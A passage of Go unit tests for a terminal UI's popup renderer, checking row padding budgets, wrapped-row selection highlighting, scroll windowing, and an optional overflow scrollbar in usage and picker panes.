		"both ends, a budget that books them":      {true, true, 5, []bool{true, false, false, false, true}},
		"both ends, a budget one short drops them": {true, true, 4, []bool{false, false, false}},
		"both ends never cost the block a row":     {true, true, 3, []bool{false, false, false}},
		"a budget under the rows still scrolls":    {true, true, 2, []bool{false, false}},
		"the opening end alone opens the block":    {true, false, -1, []bool{true, false, false, false}},
		"the opening end alone, budget books it":   {true, false, 4, []bool{true, false, false, false}},
		"the opening end alone, budget one short":  {true, false, 3, []bool{false, false, false}},
		"the closing end alone closes it":          {false, true, -1, []bool{false, false, false, true}},
		"neither is the unbroken block":            {false, false, -1, []bool{false, false, false}},
	} {
		name, tc := name, tc
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			spec := base
			spec.rowPadAbove, spec.rowStyle.padBelow, spec.maxRows = tc.above, tc.below, tc.maxRows
			lines := popupLines(renderPopup(th, spec, 40))
			flat := strip(strings.Join(lines, "\n"))
			if got := contentBlanks(lines); !slices.Equal(got, tc.want) {
				t.Errorf("content lines blank = %v, want %v:\n%s", got, tc.want, flat)
			}
			// …and whatever the pad did, the block still fits the budget it was handed: the blanks are
			// counted in it, never painted past it.
			if rowLines := len(lines) - 2; tc.maxRows >= 0 && rowLines > tc.maxRows {
				t.Errorf("row block paints %d lines, past its %d-line budget:\n%s", rowLines, tc.maxRows, flat)
			}
		})
	}
}

// The selection covers the WHOLE of a wrapped row — every line of it, in either cue — because a row
// lit on its first line and plain on its second reads as two rows, one of them somebody else's.
func TestRenderPopupWrappedSelectionCoversEveryLine(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	const width = 48
	selected := popupWrapSpec().rows[2][0]

	for name, tc := range map[string]struct {
		menu bool
		sgr  string
	}{
		"menu accent":   {menu: true, sgr: styleSGR(th.popupAccent)},
		"highlight bar": {menu: false, sgr: styleSGR(th.userBlock)},
	} {
		name, tc := name, tc
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			spec := popupWrapSpec()
			spec.menuRows = tc.menu
			lit := popupStyledLines(popupLines(renderPopup(th, spec, width)), tc.sgr)
			if len(lit) < 2 {
				t.Fatalf("the selected row wrapped but only %d line(s) carry its cue", len(lit))
			}
			var b strings.Builder
			for _, ln := range lit {
				b.WriteString(strings.TrimLeft(popupContent(ln), glyphUser+" ") + " ")
			}
			if whole := strings.Join(strings.Fields(b.String()), " "); whole != selected {
				t.Errorf("the cue covers %q, want the whole selected option %q", whole, selected)
			}
		})
	}
}

// The row budget is spent in painted LINES once rows can wrap and be separated: the block never
// outgrows the budget the frame handed it, the rows a scrolling window leaves out stay quiet (they
// are one keypress away), and a budget that cannot seat even the selected row seats NOTHING and says
// so on the title row — the same accounting a budget of zero has always had, one step earlier.
func TestRenderPopupWrappedRowsSpendTheBudgetInLines(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	const width = 48
	const title = "how to continue?"

	t.Run("a capped window fits its lines", func(t *testing.T) {
		t.Parallel()
		spec := popupWrapSpec()
		spec.title = title
		spec.selected = 0
		spec.maxRows = 4
		lines := popupLines(renderPopup(th, spec, width))
		rowLines := len(lines) - (2 + 1) // borders + title row
		if rowLines > spec.maxRows {
			t.Errorf("row block paints %d lines, past its %d-line budget:\n%s",
				rowLines, spec.maxRows, strip(strings.Join(lines, "\n")))
		}
		if rowLines < 1 {
			t.Fatalf("row block paints nothing on a budget that seats a row:\n%s", strip(strings.Join(lines, "\n")))
		}
		if got := popupInterior(lines[1]); got != title {
			t.Errorf("title row = %q, want the bare title: the rows outside a scrolling window are reachable", got)
		}
	})

	t.Run("a budget under the selected row's height counts every row", func(t *testing.T) {
		t.Parallel()
		spec := popupWrapSpec()
		spec.title = title
		spec.maxRows = 1 // the selected option wraps past one line, so no whole row fits
		lines := popupLines(renderPopup(th, spec, width))
		if got, want := len(lines), 2+1; got != want {
			t.Fatalf("pane is %d lines, want %d (borders + title, no row seated):\n%s",
				got, want, strip(strings.Join(lines, "\n")))
		}
		if got, want := popupInterior(lines[1]), title+"  … (+3 more lines)"; got != want {
			t.Errorf("title row = %q, want %q: a row too tall to seat is still counted", got, want)
		}
	})
}

// The flags off is the rendering every other pane has: the representative spec is byte-identical to
// its golden, and a long row still elides onto its ONE line rather than breaking.
func TestRenderPopupWrapAndGapOffAreUnchanged(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())

	spec := popupTitleSpec()
	spec.wrapRows = false
	spec.rowStyle.gap = false
	spec.rowPadAbove, spec.rowStyle.padBelow = false, false
	if off := strip(renderPopup(th, spec, 40)); off != popupTitleRowGolden {
		t.Errorf("flags off drifted from the list rendering:\ngot:\n%s\n\nwant:\n%s", off, popupTitleRowGolden)
	}

	long := popupWrapSpec()
	long.wrapRows = false
	long.rowStyle.gap = false
	long.rowPadAbove, long.rowStyle.padBelow = false, false
	lines := popupLines(renderPopup(th, long, 48))
	if got, want := len(lines), 2+len(long.rows); got != want {
		t.Fatalf("flags off rendered %d lines, want %d (one line a row):\n%s",
			got, want, strip(strings.Join(lines, "\n")))
	}
	if !strings.Contains(strip(strings.Join(lines, "\n")), "…") {
		t.Errorf("flags off: the long row was not elided:\n%s", strip(strings.Join(lines, "\n")))
	}
}

// popupRowWindowFrom opens the window AT the row it is given and grows downward only — the scroll a
// list with no cursor in it is read by (popupSpec.rowTop, the /usage report). At the top of a list it
// answers exactly what popupRowWindow answers for a selection of −1, which is what leaves every
// selection-less pane written before it unchanged; past the end of one it seats the last row rather
// than nothing; and it spends its budget on the same terms — real heights, separators, whole rows.
func TestPopupRowWindowFrom(t *testing.T) {
	cases := []struct {
		name               string
		top                int
		heights            []int
		gap, budget        int
		wantStart, wantEnd int
	}{
		{"the top of a short list shows all of it", 0, popupRowHeightsOfOne(5), 0, 8, 0, 5},
		{"the top of a long list is the first window", 0, popupRowHeightsOfOne(30), 0, 8, 0, 8},
		{"scrolled down it grows downward only", 6, popupRowHeightsOfOne(30), 0, 8, 6, 14},
		{"the last full window ends on the last row", 22, popupRowHeightsOfOne(30), 0, 8, 22, 30},
		{"past the end seats the last row", 40, popupRowHeightsOfOne(30), 0, 8, 29, 30},
		{"a negative top reads from the first row", -3, popupRowHeightsOfOne(30), 0, 8, 0, 8},
		{"empty list", 0, nil, 0, 8, 0, 0},
		{"wrapped rows spend their real height", 0, []int{3, 2, 1}, 0, 5, 0, 2},
		{"separators cost a line each", 0, popupRowHeightsOfOne(3), 1, 4, 0, 2},
		{"a budget under the top row's height seats nothing", 1, []int{1, 3, 1}, 0, 2, 0, 0},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			start, end := popupRowWindowFrom(c.top, c.heights, c.gap, c.budget)
			if start != c.wantStart || end != c.wantEnd {
				t.Errorf("popupRowWindowFrom(%d,%v,gap %d,budget %d) = [%d,%d), want [%d,%d)",
					c.top, c.heights, c.gap, c.budget, start, end, c.wantStart, c.wantEnd)
			}
			if spent := popupRowBlockLines(c.heights[start:end], c.gap, 0); spent > c.budget {
				t.Errorf("window [%d,%d) paints %d lines, past the %d-line budget", start, end, spent, c.budget)
			}
		})
	}
}

// popupBarCell is the LAST inner cell of a rendered popup line — the column the row block's overflow
// bar paints into (popupRowScrollbar) — read off the stripped line past its right border rune and the
// border style's own padding cell. Every row these tests hand the pane is ASCII and both bar glyphs
// are one cell wide, so a rune index is a column index here.
func popupBarCell(line string) string {
	runes := []rune(strip(line))
	if len(runes) < 3 {
		return ""
	}
	return string(runes[len(runes)-3])
}

// popupBarColumn is the bar glyph of every painted line that carries one, top to bottom — the
// rendered pane's scrollbar read as a column of cells, so an assertion about the thumb's POSITION
// does not have to know which painted row the block began on.
func popupBarColumn(out string) []string {
	var column []string
	for _, line := range popupLines(out) {
		if cell := popupBarCell(line); cell == glyphScrollThumb || cell == glyphScrollTrack {
			column = append(column, cell)
		}
	}
	return column
}

// popupThumbSpan is where the thumb sits in a bar column: the index of its first cell and how many
// cells it covers. It reports −1, 0 for a column with no thumb in it at all.
func popupThumbSpan(column []string) (at, size int) {
	at = -1
	for i, cell := range column {
		if cell != glyphScrollThumb {
			continue
		}
		if at < 0 {
			at = i
		}
		size++
	}
	return at, size
}

// popupScrollbarSpec is the list these scrollbar tests window: n one-line rows, a title and a hint,
// with the caller setting the budget, the cursor and the flag.
func popupScrollbarSpec(n, maxRows int) popupSpec {
	labels := make([]string, n)
	for i := range labels {
		labels[i] = fmt.Sprintf("row %d", i)
	}
	return popupSpec{
		title:     "mechanisms",
		rows:      singleCellRows(labels),
		selected:  0,
		hint:      "esc close",
		maxRows:   maxRows,
		scrollbar: true,
	}
}

// A row window that seats the WHOLE list paints no bar and gives up no column: the pane a scrollbar
// spec renders at is byte-identical to the one the same spec renders without the flag, so a surface
// that opts in pays nothing on the windows where its list fits (ratified call 6).
func TestRenderPopupScrollbarIsAbsentWhileTheRowsFit(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	spec := popupScrollbarSpec(4, 8)
	off := spec
	off.scrollbar = false
	for _, width := range []int{40, 60, 98} {
		with, without := renderPopup(th, spec, width), renderPopup(th, off, width)
		if column := popupBarColumn(with); len(column) != 0 {
			t.Errorf("width %d: a fitting list painted %d bar cells, want none", width, len(column))
		}
		if with != without {
			t.Errorf("width %d: the flag changed a fitting pane's paint:\n%s\nwant:\n%s",
				width, strip(with), strip(without))
		}
	}
}

// An OVERFLOWING window paints the bar down the block's last column — one cell per painted row line,
// none on the title or the hint — and the rows are composed one column narrower to pay for it: a row
// that fills the pane's inner width exactly is elided with the bar and whole without it. The bar's
// own cells sit on the pane's black field like every other cell (the black-fill contract).
func TestRenderPopupScrollbarReservesOneColumnWhileOverflowing(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	const width, shown = 60, 3
	inner := popupInnerWidth(th, width)
	spec := popupScrollbarSpec(9, shown)
	spec.rows[1] = popupRow{strings.Repeat("x", inner-popupRowIndent)} // exactly fills the full width
	off := spec
	off.scrollbar = false

	out := renderPopup(th, spec, width)
	if column := popupBarColumn(out); len(column) != shown {
		t.Errorf("bar column is %d cells, want one per shown row (%d): %q", len(column), shown, column)
	}
	for i, line := range popupLines(out) {
		if w := lipgloss.Width(line); w != width {
			t.Errorf("line %d is %d cells, want %d: %q", i, w, width, strip(line))
		}
		if col, ok := firstCellWithoutBackground(line); !ok {
			t.Errorf("line %d has a bare (no-background) cell at column %d: %q", i, col, strip(line))
		}
	}
	if wide := popupLineWith(t, out, "xxx"); !strings.Contains(strip(wide), "…") {
		t.Errorf("the full-width row was not elided into the reserved column: %q", strip(wide))
	}
	if wide := popupLineWith(t, renderPopup(th, off, width), "xxx"); strings.Contains(strip(wide), "…") {
		t.Errorf("without the bar the same row should still fit whole: %q", strip(wide))
	}
}

// The thumb says WHERE the window is: flush at the top with the first row seated, flush at the bottom
// with the last one, and never moving backwards as the reader scrolls down — the transcript bar's
// contract on a pane whose window is scrolled rather than walked (popupSpec.rowTop).
func TestRenderPopupScrollbarThumbTracksTheWindow(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	const width, rows, shown = 60, 12, 4
	spec := popupScrollbarSpec(rows, shown)
	spec.selected = -1 // a report: the window opens where rowTop puts it

	last := 0
	for top := 0; top <= rows-shown; top++ {
		spec.rowTop = top
		column := popupBarColumn(renderPopup(th, spec, width))
		if len(column) != shown {
			t.Fatalf("top %d: bar column is %d cells, want %d", top, len(column), shown)
		}
		at, size := popupThumbSpan(column)
		if size < 1 {
			t.Fatalf("top %d: no thumb in the bar: %q", top, column)
		}
		if want := max(1, shown*shown/rows); size != want {
			t.Errorf("top %d: thumb is %d cells, want %d", top, size, want)
		}
		switch top {
		case 0:
			if at != 0 {
				t.Errorf("top 0: thumb starts at %d, want flush at the top", at)
			}
		case rows - shown:
			if at+size != len(column) {
				t.Errorf("last window: thumb ends at %d of %d, want flush at the bottom", at+size, len(column))
			}
		}
		if at < last {
			t.Errorf("top %d: thumb moved back to %d from %d", top, at, last)
		}
		last = at
	}
}

// The flag is the whole of the opt-in: a spec that leaves it false paints no bar however far its list
// overflows, which is what keeps every pane that has not adopted one rendering as it always did.
func TestRenderPopupWithoutTheFlagNeverPaintsABar(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	spec := popupScrollbarSpec(30, 3)
	spec.scrollbar = false
	for _, width := range []int{40, 60, 98} {
		if column := popupBarColumn(renderPopup(th, spec, width)); len(column) != 0 {
			t.Errorf("width %d: %d bar cells painted with the flag off: %q", width, len(column), column)
		}
	}
}

// With WRAPPED rows the bar spans the block's painted LINES while its thumb is sized from the ROW
// counts: every line of every seated row carries a cell, the continuation lines included, so the bar
// is one unbroken stroke down a block whose rows are not one line each.
func TestRenderPopupScrollbarSpansWrappedRowLines(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	const width, maxRows = 50, 5
	inner := popupInnerWidth(th, width)
	long := strings.Repeat("word ", inner/2) // several lines once wrapped to the inner budget
	spec := popupSpec{
		title:     "questions",
		rows:      singleCellRows([]string{long, long, long, long}),
		selected:  0,
		hint:      "esc close",
		maxRows:   maxRows,
		wrapRows:  true,
		scrollbar: true,
	}
	out, place := renderPopupPlaced(th, spec, width)
	if place.end-place.start >= len(spec.rows) {
		t.Fatalf("the list did not overflow: window [%d,%d) of %d rows", place.start, place.end, len(spec.rows))
	}
	lines := 0
	for i := place.start; i < place.end; i++ {
		lines += len(place.blocks[i])
	}
	column := popupBarColumn(out)
	if len(column) != lines {
		t.Errorf("bar column is %d cells, want one per painted row line (%d)", len(column), lines)
	}
	if at, size := popupThumbSpan(column); at != 0 || size != max(1, lines*(place.end-place.start)/len(spec.rows)) {
		t.Errorf("thumb at %d sized %d, want a top-flush thumb sized from the row counts", at, size)
	}
	for i, line := range popupLines(out) {
		if w := lipgloss.Width(line); w != width {
			t.Errorf("line %d is %d cells, want %d: %q", i, w, width, strip(line))
		}
	}
}

// ----------------------------------------------------------------------------
// The bar's CALLERS — every pane that windows rows opts in (Model.popupScrollbarOn)
// ----------------------------------------------------------------------------

// The bar is a property of the POPUP surface rather than of one pane that grew one, so the test
// drives real panes rather than a hand-built spec: an overflowing /usage report carries the thumb,
// a picker whose whole offering is seated carries no bar at all, and `ui.show-scrollbar: false`
// (Options.HideScrollbar, the inverted form the composition root passes) takes the bar off the
// overflowing pane exactly as it takes the transcript's away.
func TestPopupCallersPaintTheOverflowBar(t *testing.T) {
	t.Parallel()

	t.Run("an overflowing /usage paints the thumb", func(t *testing.T) {
		m := usageModel(t, mainTotals, 8192)
		for i := range maxUsageRows {
			m = delegate(t, m, fmt.Sprintf("s%d", i), fmt.Sprintf("delegate %d", i), childTotals, 4096)
		}
		rows := m.usageRows()
		spec, seated := m.usageSpec(rows)
		if !seated || spec.maxRows >= len(rows) {
			t.Fatalf("the report did not overflow: %d of %d rows seated (seated=%v)", spec.maxRows, len(rows), seated)
		}
		column := popupBarColumn(m.renderUsage())
		if at, size := popupThumbSpan(column); at < 0 || size == 0 {
			t.Errorf("the overflowing report painted no thumb; its bar column is %q:\n%s",
				column, strip(m.renderUsage()))
		}
	})

	t.Run("a picker whose offering fits paints no bar", func(t *testing.T) {
		m := newTestModel(t)
		m.picker = picker{open: true, kind: pickerCycle}
		m.layout()
		pane := m.renderPicker()
		// The premise the assertion rests on: every row of the offering is on the screen, so there is
		// nothing for a bar to describe.
		for _, row := range m.pickerRows() {
			if !strings.Contains(strip(pane), row[0]) {
				t.Fatalf("the offering did not fit — %q is windowed out:\n%s", row[0], strip(pane))
			}
		}
		if column := popupBarColumn(pane); len(column) != 0 {
			t.Errorf("a fitting picker painted %d bar cells, want none:\n%s", len(column), strip(pane))
		}
	})

	t.Run("ui.show-scrollbar off takes the popup's bar with it", func(t *testing.T) {
		m := usageModel(t, mainTotals, 8192)
		for i := range maxUsageRows {
			m = delegate(t, m, fmt.Sprintf("s%d", i), fmt.Sprintf("delegate %d", i), childTotals, 4096)
		}
		m.opts.HideScrollbar = true
		if spec, _ := m.usageSpec(m.usageRows()); spec.scrollbar {
			t.Errorf("the spec still asks for a bar with the switch off")
		}
		if column := popupBarColumn(m.renderUsage()); len(column) != 0 {
			t.Errorf("the switch off still painted %d bar cells:\n%s", len(column), strip(m.renderUsage()))
		}
	})
}
